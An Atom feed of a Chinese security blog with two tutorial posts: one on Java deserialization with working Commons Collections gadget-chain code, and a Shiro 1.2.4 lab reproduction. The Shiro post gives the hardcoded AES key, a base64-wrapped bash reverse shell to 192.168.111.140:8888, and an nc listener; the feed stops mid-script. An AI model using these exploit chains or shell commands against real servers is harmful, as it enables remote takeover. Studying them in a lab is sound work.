<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Boogle&#39;s Blog</title>
  
  <subtitle>没有网络安全，就没有国家安全</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhengbao.wang/"/>
  <updated>2019-11-27T12:37:18.241Z</updated>
  <id>http://zhengbao.wang/</id>
  
  <author>
    <name>boogle</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java反序列化入门</title>
    <link href="http://zhengbao.wang/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/"/>
    <id>http://zhengbao.wang/java反序列化入门/</id>
    <published>2019-11-27T12:36:08.000Z</published>
    <updated>2019-11-27T12:37:18.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序列化与反序列化"><a href="#0x00-序列化与反序列化" class="headerlink" title="0x00 序列化与反序列化"></a>0x00 序列化与反序列化</h2><h3 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h3><p> <strong>序列化</strong>是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为<strong>反序列化</strong>。</p><h3 id="为什么要序列化和反序列化"><a href="#为什么要序列化和反序列化" class="headerlink" title="为什么要序列化和反序列化"></a>为什么要序列化和反序列化</h3><p>类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，就需要通过序列化将数据转换为字节流进行存储或者传输，在合适的地方通过对字节流反序列化继续调用该类。而创建的字节流是与平台无关的，在一个平台上序列化的对象可以在不同的平台上反序列化。 </p><h3 id="如何进行序列化和反序列化"><a href="#如何进行序列化和反序列化" class="headerlink" title="如何进行序列化和反序列化"></a>如何进行序列化和反序列化</h3><p>通过<code>ObjectOutputStream</code>类的<code>writeObject(Object obj)</code>方法可以实现序列化。</p><p>通过<code>ObjectInputStream</code>类的<code>readObject(Object obj)</code> 方法可以实现发序列化。</p><p>一个类的对象要想序列化成功，需要满足两个条件：</p><ul><li><ol><li>该类必须实现 <code>java.io.Serializable</code> 接口。</li></ol></li><li><ol start="2"><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ol></li></ul><p>下面使用一个Demo来演示该过程。</p><p>一个满足上述序列化条件的任意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    Student(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我是Student的print,下面是我输出的内容："</span>);</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">"boogle"</span>);</span><br><span class="line">        stu.print();</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(stu);</span><br><span class="line">        oos.close();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的序列化Demo，将序列化后的字节流保存在了<code>object.ser</code>文件中。</p><p>查看该文件，可以看到序列化特征头<code>AC ED 00 05</code></p><p><img src="https://i.loli.net/2019/11/27/NWX9jg2kGU6uaSB.png" alt></p><p>然后写一个反序列化Demo,将上面的字节流文件还原为对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeSerImp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 以下就是反序列化操作</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);  </span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);      </span><br><span class="line">       </span><br><span class="line">        Student deSerObj = (Student) ois.readObject();</span><br><span class="line">        System.out.println(deSerObj);</span><br><span class="line">        deSerObj.print();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后输出</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Student@b815859</span><br><span class="line">我是Student的<span class="built_in">print</span>,下面是我输出的内容：</span><br><span class="line">boogle</span><br></pre></td></tr></table></figure><h2 id="0x01-反序列化漏洞"><a href="#0x01-反序列化漏洞" class="headerlink" title="0x01 反序列化漏洞"></a>0x01 反序列化漏洞</h2><p>在java反序列化的过程中，会调用反序列化类的<code>readObject()</code>方法，如果该方法书写不当，将会产生反序列化漏洞。</p><p>我们对上面的<code>Student</code>类稍加修改，重写其<code>readObject()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//添加cmd属性，用于要执行的命令</span></span><br><span class="line">    <span class="keyword">public</span> String cmd = <span class="string">"calc.exe"</span>; </span><br><span class="line"></span><br><span class="line">    Student(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我是Student的print,下面是我输出的内容："</span>);</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用之前的代码，对该类重新进行序列化反序列化后，将会运行<code>readObject</code>方法里的命令，弹出计算器。</p><p><img src="https://i.loli.net/2019/11/27/NxSZBvh4zpD6MbG.png" alt></p><p>此时在序列化时将<code>cmd</code>赋值为任意命令，便可以执行任意命令。</p><p><img src="https://i.loli.net/2019/11/27/aMrJC8OvkxAHudU.png" alt></p><p>当然，这仅仅是一个测试的Demo，真实的代码中可能并不会出现入此低级的问题，但在真实环境中，可以通过一些列的调用代码链，最终达到上述Demo所实现的执行任意命令的效果。下面引入一个实例: Apache Commons Collections反序列化漏洞。</p><h2 id="0x02-Apache-Commons-Collections反序列化漏洞"><a href="#0x02-Apache-Commons-Collections反序列化漏洞" class="headerlink" title="0x02  Apache Commons Collections反序列化漏洞"></a>0x02  Apache Commons Collections反序列化漏洞</h2><p> Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库。它包含有很多jar工具包，提供了很多强有力的数据结构类型并且实现了各种集合工具类。  WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等均使用了该第三方库。</p><p>在2015年11月6日FoxGlove Security安全团队的@breenmachine公布了Apache Commons Collections配合java反序列化漏洞实现远程命令执行的真实案例，使用了该库的各大java Web Server都受到影响。</p><p>首先搭建漏洞环境，在<code>web.xml</code>中添加以下配置获取受影响的<code>commons-collections</code>版本。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>Commons Collections</code>中实现了对Java标准数据结构Map接口的一个扩展类<code>TransformedMap</code>。 该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换， 具体的变换逻辑由Transformer类定义 。</p><p>查看<code>Transformer</code>接口类的具体实现，其问题出现在<code>InvokerTransformer</code>类。</p><p><img src="https://i.loli.net/2019/11/27/qvzHV5ctfxupS9A.png" alt></p><p>查看<code>InvokerTransformer</code>类实现的<code>transform</code>方法， 该方法中采用了反射的方法进行函数调用，其中的参数均为可控参数，因为可控制该方法实现任意代码执行。</p><p><img src="https://i.loli.net/2019/11/27/lbJuea15jhGEoBq.png" alt></p><p>那么现在可以通过 可以通过<code>TransformedMap.decorate()</code>方法，获得一个<code>TransformedMap</code>的实例。  当该实例内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法，执行任意命令。</p><p>现在进行Demo测试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC_Test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>);</span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedmap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"123"</span>);  <span class="comment">//对value进行改变时将触发transform()方法</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://i.loli.net/2019/11/27/nWxA7wyCIkLdSqf.png" alt></p><p>现在想要在反序列化中进行利用，需要在<code>readObject</code>方法中对Map进行其<code>value</code>值的改变，我们修改上面的<code>Student</code>类，使其满足我们这一美好的愿望。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Map map;</span><br><span class="line"></span><br><span class="line">    Student(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Map.Entry entry = (Map.Entry) map.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后构造利用poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">"boogle"</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"curl 127.0.0.1:8000/poc_test"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>);</span><br><span class="line"></span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        stu.map = transformedmap;</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(stu);</span><br><span class="line">        oos.close();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功请求到url</p><p><img src="https://i.loli.net/2019/11/27/KCDPxJo4U81zfXg.png" alt></p><p>但是对于这样我们理想的<code>Student</code>类还是不够通用，那么有没有具备这么理想的条件，即在<code>readObject</code>方法中有对<code>Map</code>类型进行<code>setVlalue</code>操作的理想类，而且又能够通用的类呢？</p><p>回答是肯定的，这个类就是<code>AnnotationInvocationHandler</code>。其位置在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。</p><p><img src="https://i.loli.net/2019/11/27/SsZp4Xo6YvEcuiH.png" alt></p><p>这样一来，Commons Collections Java反序列化漏洞的通用Poc便出来了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC_Test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>);</span><br><span class="line"></span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(ins);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-ysoserial"><a href="#0x03-ysoserial" class="headerlink" title="0x03 ysoserial"></a>0x03 ysoserial</h2><p> <code>ysoserial</code>是集合了各种java反序列化payload的一个java反序列化工具。项目地址 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial </a></p><p>使用<code>ysoserial</code>可以快速构建上面的payload</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections1 <span class="string">"curl 127.0.0.1/ysoserial_test"</span> |xxd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/27/puPkyxXLhRr8jQ7.png" alt></p><p>成功执行命令</p><p><img src="https://i.loli.net/2019/11/27/xt6WDrYXZjoa4iI.png" alt></p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.cnblogs.com/lsdb/p/9830363.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsdb/p/9830363.html </a></p><p><a href="https://www.cnblogs.com/he1m4n6a/p/10131566.html" target="_blank" rel="noopener">https://www.cnblogs.com/he1m4n6a/p/10131566.html </a></p><p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041 </a></p><p><a href="https://blog.csdn.net/bigtree_3721/article/details/51263780" target="_blank" rel="noopener"> https://blog.csdn.net/bigtree_3721/article/details/51263780 </a></p><p><a href="https://my.oschina.net/swrite/blog/530188" target="_blank" rel="noopener"> https://my.oschina.net/swrite/blog/530188 </a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序列化与反序列化&quot;&gt;&lt;a href=&quot;#0x00-序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;0x00 序列化与反序列化&quot;&gt;&lt;/a&gt;0x00 序列化与反序列化&lt;/h2&gt;&lt;h3 id=&quot;什么是序列化和反序列化&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="java" scheme="http://zhengbao.wang/tags/java/"/>
    
      <category term="反序列化" scheme="http://zhengbao.wang/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>shiro 1.2.4反序列化漏洞复现</title>
    <link href="http://zhengbao.wang/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://zhengbao.wang/shiro-1-2-4反序列化漏洞复现/</id>
    <published>2019-11-19T06:49:51.000Z</published>
    <updated>2019-11-27T12:47:30.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在官网中可以得到该漏洞的描述，主要原因是因为shiro默认使用了<code>CookieRememberMeManager</code>, 其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，其密钥硬编码在代码中为<code>kPH+bIxk5D2deZiIxcaaaA==</code>。导致攻击者可以构造任意数据从而造成反序列化漏洞。 </p><p><img src="https://i.loli.net/2019/11/19/cA4quePmpQBEyVi.png" alt></p><p>漏洞影响版本为<code>shiro &lt;= 1.2.4</code></p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>使用docker快速搭建漏洞环境</p><p><code>docker pull medicean/vulapps:s_shiro_1</code> </p><p><code>docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></p><p><img src="https://i.loli.net/2019/11/19/gnPpdaBmHxc9vjD.png" alt></p><h3 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h3><p>获取java反序列化利用神器<code>ysoserial</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git　<span class="built_in">clone</span> https://github.com/frohoff/ysoserial.git</span><br><span class="line"><span class="built_in">cd</span> ysoserial</span><br><span class="line">mvn package -DskipTests</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<code>ysoserial</code>中JRMP监听模块并配置监听端口，添加要执行的命令。这里执行反弹shell命令<code>bash -i &gt;&amp; /dev/tcp/192.168.111.140/8888 0&gt;&amp;1</code></p><p>这里命令需要进行一下base64编码 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="https://i.loli.net/2019/11/19/Jx3bFv8ltQXAKD5.png" alt></p><p>然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JPListener 3888 CommonsCollections4 <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xNDAvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span></span><br></pre></td></tr></table></figure><p>然后监听本地<code>8888</code>端口，等待反弹shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure><p>使用如下脚本得到构造好的<code>rememberMe</code>值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span 